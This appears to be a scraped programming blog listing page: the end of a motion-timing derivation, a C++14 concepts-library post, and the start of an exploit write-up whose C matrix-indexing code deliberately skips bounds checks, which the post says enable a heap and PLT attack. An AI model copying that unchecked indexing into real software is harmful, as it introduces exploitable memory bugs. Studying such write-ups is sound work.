class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">2</span><span class="mord mathnormal">A</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">c</span><span class="mord mathnormal mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span><span style="top:-2.8950000000000005em;"><span class="pstrut" style="height:3.2em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.28em;"><svg width="400em" height="1.28em" viewBox="0 0 400000 1296" preserveAspectRatio="xMinYMin slice"><path d="M263,681c0.7,0,18,39.7,52,119 c34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120 c340,-704.7,510.7,-1060.3,512,-1067 l0 -0 c4.7,-7.3,11,-11,19,-11 H40000v40H1012.3 s-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232 c-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1 s-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26 c-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60z M1001 80h400000v40h-400000z"></path></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.30499999999999994em;"><span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-0.22311500000000117em;"><span class="pstrut" style="height:4.23em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.23em;"><span style="top:-2.5847100000000003em;"><span class="pstrut" style="height:3.2707100000000002em;"></span><span class="mord"><span class="mord mathnormal">A</span></span></span><span style="top:-3.50071em;"><span class="pstrut" style="height:3.2707100000000002em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-4.23em;"><span class="pstrut" style="height:3.2707100000000002em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">±</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.27071em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.91642em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463142857142857em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal">x</span></span></span><span style="top:-3.2307099999999997em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.8800000000000001em;"><svg width="400em" height="1.8800000000000001em" viewBox="0 0 400000 1944" preserveAspectRatio="xMinYMin slice"><path d="M983 90 l0 -0 c4,-6.7,10,-10,18,-10 H400000v40 H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7 s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744 c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30 c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722 c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5 c53.7,-170.3,84.5,-266.8,92.5,-289.5z M1001 80h400000v40h-400000z"></path></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5692900000000001em;"><span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:4.992884999999999em;"><span></span></span></span></span></span></span></span></span></span></span></span></p>

<p>Even though there are 2 solutions (either plus or minus), we’ll only want one of
those. As both <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> and <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span> are positive, there’ll only be 2 possibilities
for the signs of these solutions:</p>

<ol>
  <li>
    <p>One is positive, one is negative. This means that you haven’t yet reached
the switchover point. Take the positive one (the negative one is what we get
if we reverse time).</p>
  </li>
  <li>
    <p>Both are negative. This means that you started slowing down too late. Still,
for the time you missed the switch, take the higher one.</p>
  </li>
</ol>

<p>In both cases, we take the higher solution, leaving us with:</p>

<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>t</mi><mo>=</mo><mfrac><mrow><mo>&#x2212;</mo><mi>v</mi><mo>+</mo><msqrt><mrow><mfrac><msup><mi>v</mi><mn>2</mn></msup><mn>2</mn></mfrac><mo>+</mo><mi>A</mi><mi>x</mi></mrow></msqrt></mrow><mi>A</mi></mfrac><mo>=</mo><msub><mi>t</mi><mrow><mi>s</mi><mi>t</mi><mi>o</mi><mi>p</mi></mrow></msub><mo>+</mo><msqrt><mrow><mfrac><mn>1</mn><mn>2</mn></mfrac><msubsup><mi>t</mi><mrow><mi>s</mi><mi>t</mi><mi>o</mi><mi>p</mi></mrow><mn>2</mn></msubsup><mo>+</mo><mfrac><mi>x</mi><mi>A</mi></mfrac></mrow></msqrt></mrow><annotation encoding="application/x-tex">t = \frac{-v + \sqrt{ {v^2 \over 2} + Ax }} {A}
  = t_{stop} + \sqrt{ {1 \over 2}t_{stop}^2 + {x \over A}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.916em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.23em;"><span style="top:-2.5847100000000003em;"><span class="pstrut" style="height:3.2707100000000002em;"></span><span class="mord"><span class="mord mathnormal">A</span></span></span><span style="top:-3.50071em;"><span class="pstrut" style="height:3.2707100000000002em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-4.23em;"><span class="pstrut" style="height:3.2707100000000002em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.27071em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.91642em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463142857142857em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal">x</span></span></span><span style="top:-3.2307099999999997em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.8800000000000001em;"><svg width="400em" height="1.8800000000000001em" viewBox="0 0 400000 1944" preserveAspectRatio="xMinYMin slice"><path d="M983 90 l0 -0 c4,-6.7,10,-10,18,-10 H400000v40 H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7 s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744 c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30 c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722 c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5 c53.7,-170.3,84.5,-266.8,92.5,-289.5z M1001 80h400000v40h-400000z"></path></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5692900000000001em;"><span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9011879999999999em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.28055599999999997em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">p</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.44em;vertical-align:-0.788405em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.651595em;"><span class="svg-align" style="top:-4.4em;"><span class="pstrut" style="height:4.4em;"></span><span class="mord" style="padding-left:1em;"><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.795908em;"><span style="top:-2.4542440000000005em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">p</span></span></span></span><span style="top:-3.0448000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.38186399999999987em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">A</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><span style="top:-3.6115950000000003em;"><span class="pstrut" style="height:4.4em;"></span><span class="hide-tail" style="min-width:1.02em;height:2.48em;"><svg width="400em" height="2.48em" viewBox="0 0 400000 2592" preserveAspectRatio="xMinYMin slice"><path d="M424,2478 c-1.3,-0.7,-38.5,-172,-111.5,-514c-73,-342,-109.8,-513.3,-110.5,-514 c0,-2,-10.7,14.3,-32,49c-4.7,7.3,-9.8,15.7,-15.5,25c-5.7,9.3,-9.8,16,-12.5,20 s-5,7,-5,7c-4,-3.3,-8.3,-7.7,-13,-13s-13,-13,-13,-13s76,-122,76,-122s77,-121,77,-121 s209,968,209,968c0,-2,84.7,-361.7,254,-1079c169.3,-717.3,254.7,-1077.7,256,-1081 l0 -0c4,-6.7,10,-10,18,-10 H400000 v40H1014.6 s-87.3,378.7,-272.6,1166c-185.3,787.3,-279.3,1182.3,-282,1185 c-2,6,-10,9,-24,9 c-8,0,-12,-0.7,-12,-2z M1001 80 h400000v40h-400000z"></path></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.788405em;"><span></span></span></span></span></span></span></span></span></span></p>
<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1" role="doc-endnote">

      <p>The comparison simplifies to <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mi>A</mi><mi>x</mi><mo>+</mo><msup><mi>v</mi><mn>2</mn></msup><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">2Ax + v^2 &gt; 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mord mathnormal">A</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.853208em;vertical-align:-0.0391em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>, which is true if the
switchover has not been reached. <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>
</div>
  

  <h2 class="fenced-y text-centre bleed"><a href="/posts/cpp14-concept-1">Even More Concepts in C++14 (part 1)</a></h2>
  
    <div class="bounded"><p>Despite Concepts Lite not making it into the standard (yet), there is still an
extensive use of them in the standard library. It has its place in user
libraries as well (most notable <a href="https://github.com/ericniebler/range-v3">ranges-v3</a>), providing a friendlier tool to
use alongside SFINAE. Today, I’ll provide (yet another) C++14-compatible
implementation of them.</p>

<!--more-->

<blockquote>
  <p><em>Update, several years later:</em> I never got around to making a second article.
Also, we’ve got actual concepts in C++20 now, so there’s that.</p>
</blockquote>

<h2 id="previous-work"><a href="#previous-work">Previous Work</a></h2>

<p>Many other libraries have also been made to support concepts in c++. For
example, <a href="https://github.com/pfultz2/Tick">Tick</a>, which provides concept checking in C++11 (albeit with some
macros) and <a href="https://github.com/ericniebler/range-v3/blob/e411a19a312542be98ec9f318ef5b335e0fdaf0a/include/range/v3/utility/concepts.hpp">concepts in ranges-v3</a>, which is a completely library-only
solution (no preprocessor!). However, both those libraries are decently heavy -
Tick is a whole library, and the ranges-v3 implementation requires the meta
template metaprogramming library (unless you go back far enough in the commit
history).</p>

<h2 id="yet-another-concepts-library"><a href="#yet-another-concepts-library">Yet Another Concepts Library</a></h2>

<p>I’ve been able to make a single header implementation in under 200 lines, with
the core component taking less than 50 lines. The syntax is similar to
ranges-v3’s implementation, declaring the requirements in the return type of a
template member function. Concept checking is also similar.</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="c1">// Concept definition</span>
<span class="k">struct</span> <span class="nc">EqualityComparable</span>
<span class="p">{</span>
	<span class="k">static</span> <span class="kt">void</span> <span class="n">implicit_bool</span><span class="p">(</span><span class="kt">bool</span><span class="p">);</span>

	<span class="k">template</span> <span class="o">&lt;</span><span class="k">typename</span> <span class="nc">T</span><span class="p">&gt;</span>
	<span class="k">auto</span> <span class="n">requires_</span><span class="p">(</span><span class="n">T</span><span class="o">&amp;&amp;</span> <span class="n">a</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="k">decltype</span><span class="p">(</span><span class="n">implict_bool</span><span class="p">(</span><span class="n">a</span> <span class="o">==</span> <span class="n">a</span><span class="p">));</span>
<span class="p">};</span>

<span class="c1">// Concept checking</span>
<span class="k">static</span> <span class="k">constexpr</span> <span class="kt">bool</span> <span class="n">int_models_ec</span> <span class="o">=</span> <span class="n">concepts</span><span class="o">::</span><span class="n">models</span><span class="o">&lt;</span><span class="n">EqualityComparable</span><span class="p">,</span> <span class="kt">int</span><span class="o">&gt;::</span><span class="n">value</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="core-implementation"><a href="#core-implementation">Core Implementation</a></h2>

<p>The implementation is somewhat based off of ranges-v3’s implementation, and uses
overload  resolution to determine if a concept is matched. No <code class="language-plaintext highlighter-rouge">void_t</code> detection
idiom required.</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="k">template</span> <span class="o">&lt;</span><span class="k">typename</span><span class="o">...</span><span class="p">&gt;</span>
<span class="k">auto</span> <span class="n">models_</span><span class="p">(...)</span> <span class="o">-&gt;</span> <span class="n">std</span><span class="o">::</span><span class="n">false_type</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>This catch-all function is the fallback if the concept is not matched. This
ensures that the overload set is not empty after SFINAE. The ellipses (<code class="language-plaintext highlighter-rouge">...</code>)
parameter list is a variadic parameter list (whose actual use is effectively
replaced by templates), which accepts any and all arguments. The caller cleans
this up, so it’s all OK. Besides, this should never be actually called.</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="k">template</span> <span class="o">&lt;</span><span class="k">typename</span><span class="o">...</span> <span class="nc">Ts</span><span class="p">,</span> <span class="k">typename</span> <span class="nc">Concept</span><span class="p">,</span>
	<span class="k">typename</span> <span class="o">=</span> <span class="k">decltype</span><span class="p">(</span>
		<span class="n">std</span><span class="o">::</span><span class="n">declval</span><span class="o">&lt;</span><span class="n">Concept</span><span class="o">&amp;</span><span class="p">&gt;()</span>
			<span class="p">.</span><span class="k">template</span> <span class="n">requires_</span><span class="o">&lt;</span><span class="n">Ts</span><span class="p">...&gt;(</span><span class="n">std</span><span class="o">::</span><span class="n">declval</span><span class="o">&lt;</span><span class="n">Ts</span><span class="o">&gt;</span><span class="p">()...)</span>
		<span class="p">)</span><span class="o">&gt;</span>
<span class="k">auto</span> <span class="n">models_</span><span class="p">(</span><span class="n">Concept</span><span class="o">*</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">std</span><span class="o">::</span><span class="n">true_type</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This is the part of the concept checking that does all the work. It uses SFINAE
to remove it (and falling back to the other one) if the return type is not
well-formed for the given template types. Why a pointer as an argument? I’m not
sure, I was just following Eric Niebler’s implementation (<a href="https://github.com/ericniebler/range-v3/blob/e411a19a312542be98ec9f318ef5b335e0fdaf0a/include/range/v3/utility/concepts.hpp#L112">which also uses a
pointer</a>).  I’m guessing it bypasses having to use <code class="language-plaintext highlighter-rouge">declval</code> and that kind of
stuff, while still getting the concept type.</p>

<h2 id="helpers"><a href="#helpers">Helpers</a></h2>

<p>These are just a few helpers to make defining and checking concepts easier:</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="k">template</span> <span class="o">&lt;</span><span class="k">typename</span> <span class="nc">Concept</span><span class="p">,</span> <span class="k">typename</span><span class="o">...</span> <span class="nc">Ts</span><span class="p">&gt;</span>
<span class="k">using</span> <span class="n">models</span> <span class="o">=</span> <span class="k">decltype</span><span class="p">(</span><span class="n">models_</span><span class="o">&lt;</span><span class="n">Ts</span><span class="p">...</span><span class="o">&gt;</span><span class="p">(</span><span class="k">static_cast</span><span class="o">&lt;</span><span class="n">Concept</span><span class="o">*&gt;</span><span class="p">(</span><span class="nb">nullptr</span><span class="p">)));</span>

<span class="k">template</span> <span class="o">&lt;</span><span class="k">typename</span><span class="o">...</span> <span class="nc">Ts</span><span class="p">&gt;</span>
<span class="kt">void</span> <span class="nf">valid_expr</span><span class="p">(</span><span class="n">Ts</span><span class="o">&amp;&amp;</span><span class="p">...);</span>

<span class="k">template</span> <span class="o">&lt;</span><span class="k">typename</span><span class="o">...</span><span class="p">&gt;</span>
<span class="k">using</span> <span class="n">exists</span> <span class="o">=</span> <span class="kt">int</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">models</code> alias wraps <code class="language-plaintext highlighter-rouge">models_()</code>, providing a friendlier interface.
<code class="language-plaintext highlighter-rouge">valid_expr</code> checks if all expressions passed are valid (e.g.
<code class="language-plaintext highlighter-rouge">decltype(valid_expr(i++, ++i))</code>). <code class="language-plaintext highlighter-rouge">exists</code> is the same, but with types (e.g.
<code class="language-plaintext highlighter-rouge">exists&lt;typename T::value_type, typename T::reference&gt;</code>).</p>

<h2 id="refining-concepts"><a href="#refining-concepts">Refining Concepts?</a></h2>

<p>Right now, the implementation does directly support refining concepts. You can
do this in a roundabout way with <code class="language-plaintext highlighter-rouge">enable_if</code>, but it’s quite non-natural
considering how common refinement is:</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="k">template</span> <span class="o">&lt;</span><span class="k">typename</span> <span class="nc">T</span><span class="p">&gt;</span>
<span class="n">requires_</span><span class="p">(</span><span class="n">T</span><span class="o">&amp;&amp;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">exists</span><span class="o">&lt;</span>
		<span class="k">decltype</span><span class="p">(</span><span class="cm">/*whatever you're checking*/</span><span class="p">),</span>
		<span class="n">std</span><span class="o">::</span><span class="n">enable_if_t</span><span class="o">&lt;</span><span class="n">models</span><span class="o">&lt;</span><span class="cm">/* base concept */</span><span class="p">,</span> <span class="n">T</span><span class="o">&gt;&gt;</span>
	<span class="o">&gt;</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>That’s why there’s going to be part 2 (when I decide to make it).</p>

<p>All code is on <a href="https://gist.github.com/ralismark/e30a1f4988748d4f700da44fef36c606">Github</a>.</p>

</div>
  

  <h2 class="fenced-y text-centre bleed"><a href="/posts/a-tale-of-indices">A Tale of Indices</a></h2>
  
    <div class="bounded"><p>This is the story of how bad indexing code can lead to an exploit. Even though
this is on the heap, most of it doesn’t actually involve malloc that much, but
relies on a specific feature of it: memory blocks are adjacent. However, it does
involve messing with the plt!</p>

<!--more-->

<h2 id="a-wild-bug-appears"><a href="#a-wild-bug-appears">A Wild Bug Appears</a></h2>

<p>First, the code. This is not exactly the original code, but simplified quite a
bit (removing the input logic, much checking and other functionality).</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre></td><td class="rouge-code"><pre><span class="k">struct</span> <span class="n">matrix</span>
<span class="p">{</span>
	<span class="kt">int</span> <span class="n">rows</span><span class="p">,</span> <span class="n">cols</span><span class="p">;</span>
	<span class="kt">float</span><span class="o">*</span> <span class="n">data</span><span class="p">;</span> <span class="c1">// allocated in the heap, has rows * cols floats</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">matrix</span><span class="o">*</span> <span class="n">matrices</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span> <span class="c1">// each matrix is allocated in the heap</span>

<span class="kt">float</span><span class="o">*</span> <span class="nf">get_addr</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">,</span> <span class="kt">int</span> <span class="n">row</span><span class="p">,</span> <span class="kt">int</span> <span class="n">col</span><span class="p">)</span>
<span class="p">{</span>
	<span class="c1">// assume these values have been checked and are in range</span>
